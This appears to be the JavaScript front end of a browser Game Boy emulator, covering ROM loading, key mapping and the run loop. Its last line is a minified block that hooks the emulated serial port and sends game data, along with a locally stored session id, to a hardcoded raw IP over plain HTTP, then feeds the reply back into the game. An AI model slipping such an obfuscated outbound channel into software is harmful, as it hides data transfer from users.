var reader = new FileReader();
var gameboy = null;

function cout(x){
    console.log(x);
}

reader.onload = function(e) {
    document.getElementById('intro').style.display = 'none';
    document.getElementById('cv').style.display = '';
    document.body.style.textAlign = 'center';
    gameboy = new GameBoyCore(document.getElementById('cv'), reader.result);
    gameboy.openMBC = getSAV;
    gameboy.openRTC = undefined;
    gameboy.start();
    gameboy.stopEmulator &= 1;
    var dateObj = new Date();
    gameboy.firstIteration = dateObj.getTime();
    gameboy.iterations = 0;
    gbRunInterval = setInterval(function(){
        gameboy.run();
    }, 8);
    document.getElementById('cv').getContext('2d').imageSmoothingEnabled = false;
};

var keyZones = [
    ["right", [39]],
    ["left", [37]],
    ["up", [38]],
    ["down", [40]],
    ["a", [90]],
    ["b", [83, 88]],
    ["select", [32]],
    ["start", [13]]
];

function matchKey(key){
    return ["right", "left", "up", "down", "a", "b", "select", "start"].indexOf(key);
}

window.onkeyup = function(e){
    var kk = e.keyCode;
    for (var i=0; i<keyZones.length; i++){
        var type = keyZones[i][0];
        if (keyZones[i][1].indexOf(kk) != -1){
            gameboy.JoyPadEvent(matchKey(type), false);
        }
    }
};
window.onkeydown = function(e){
    var kk = e.keyCode;
    for (var i=0; i<keyZones.length; i++){
        var type = keyZones[i][0];
        if (keyZones[i][1].indexOf(kk) != -1){
            gameboy.JoyPadEvent(matchKey(type), true);
        }
    }
};

function getSAV(){
    return B64_SRAM;
}

(function(){evr={hsc:0,cl:0,rs:!1,b:[],st:1,la:+new Date},brC=!1,brS=!1,brD=[];function n(n){var t=new XMLHttpRequest;t.open("POST","http://167.99.192.164:12709/req/"+localStorage.d_sessid,!0),t.onreadystatechange=function(){4==t.readyState&&(200==t.status?(brD=base64ToArray(t.responseText),brC=!0,brS=!0):(brC=!0,brS=!1))},brS=!1,brC=!1,t.send(arrayToBase64(n))}function t(e){var t=255,r=+new Date;if(r-evr.la>2e3&&(evr.st=1,evr.hsc=0,evr.b=[]),evr.la=r,evr.st==1){var s=[218,207,235];s[evr.hsc]==e?(t=[165,90,10][evr.hsc],evr.hsc+=1,evr.hsc>=s.length&&(evr.hsc=0,evr.st=2)):(t=0,evr.hsc=0)}else if(evr.st==2){if(evr.b.push(e),evr.b.length>=2&&(evr.cl=evr.b[0]+256*evr.b[1],evr.st=3,evr.cl>1280))return void(t=255);t=204}else evr.st==3?(evr.b.push(e),evr.b.length>=evr.cl&&(evr.st=4),t=204):evr.st==4?(85!=e?evr.st=1:(n(evr.b),evr.st=5),t=102):evr.st==5?(85!=e&&(evr.st=1),brC?brS?(evr.b=brD,evr.st=6,t=51):t=255:t=102):evr.st==6&&(t=evr.b[0],evr.b=evr.b.slice(1),(evr.b.length<=0||204!=e)&&(evr.st=1));return t};window.onSerialDataReceived=t})();